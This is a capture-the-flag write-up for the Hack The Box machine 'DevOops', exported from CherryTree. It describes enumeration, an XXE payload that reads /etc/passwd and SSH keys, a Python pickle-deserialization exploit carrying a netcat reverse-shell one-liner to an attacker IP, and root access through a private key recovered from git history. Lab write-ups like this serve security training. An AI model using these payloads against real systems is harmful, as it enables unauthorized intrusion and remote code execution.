<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.91 DevOops</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.91 DevOops</h1><br/>nmap showed that the machine was only running ssh and gunicorn 19.7.1 on port 5000.<br />gobuster showed that their were directories on /feed and /upload<br />   gobuster dir -u http://10.10.10.91:5000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br /><br />/upload was looking for a .xml containing the elements Author, Subject, Content.<br />Useing burp I was able to successfully upload<br />&lt;yee&gt;<br />    &lt;Author&gt;Squid&lt;/Author&gt;<br />    &lt;Subject&gt;Yeet&lt;/Subject&gt;<br />    &lt;Content&gt;cannon&lt;/Content&gt;<br />&lt;/yee&gt;<br />Great!<br />Now my research on gunicorn 19.7.1 has stated that it is vulnerable to xxe (xml eXternal entity).<br />In other words, it may execute certain formats of code in the elements allowing you to read files.<br />I drew this this up to read /etc/passwd. (props to payloadallthethings)<br /><br />&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;/etc/passwd&#39;&gt;]&gt;<br />&lt;yee&gt;<br />    &lt;Author&gt;Squid&lt;/Author&gt;<br />    &lt;Subject&gt;&amp;test;&lt;/Subject&gt;<br />    &lt;Content&gt;cannon&lt;/Content&gt;<br />&lt;/yee&gt; <br /><br />/etc/passwd is dumped!<br />From here I dumped the id_rsa key to the one user that wasn&#39;t root and logged in via ssh, but There was another inteded way to do it with pickles.<br />The main page for the website was feed.py. When I dumped it I saw the funciton...<br /><br />@app.route(&quot;/newpost&quot;, methods=[&quot;POST&quot;])<br />def newpost():<br />  # TODO: proper save to database, this is for testing purposes right now<br />  picklestr = base64.urlsafe_b64decode(request.data)<br />#  return picklestr<br />  postObj = pickle.loads(picklestr)<br />  return &quot;POST RECEIVED: &quot; + postObj[&#39;Subject&#39;]<br />  <br />looks like we can POST to this new directory /newpost.<br />We can also see that the the input will be urlsafe_b64decoded, so we will need to urlsafe_b64encode or request before we send it.<br />I wrote up this python script to run pentestmonkeys&#39; nc oneliner<br /><br />pickle_exploit.py<br />######################################################## <br />import pickle<br />from base64 import urlsafe_b64encode<br /><br />RUNME = &quot;&quot;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.60 3232 &gt;/tmp/f&quot;&quot;&quot;<br /><br />class Yeet(object):<br />        def __reduce__(self):<br />                import os<br />                return(os.system, (RUNME,))<br /><br />print urlsafe_b64encode(pickle.dumps(Yeet()))<br />#print pickle.dumps(Yeet())<br />#########################################################<br /><br />In burp I sent a post request to /newpost and caught a reverse shell with nc!<br />user.txt!<br /><br />during basic enumeration I saw a .git directory in roosa&#39;s home.<br />git log             and now I can see the commits. One of the commits states that she fixed a commit with proper key.<br />git diff 33e87c312c08735a02fa9c796021a4a3023129ad       and we can see that a private key was changed.<br />take the new private key, chmod, ssh in as root...<br />root.txt<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div></body></html>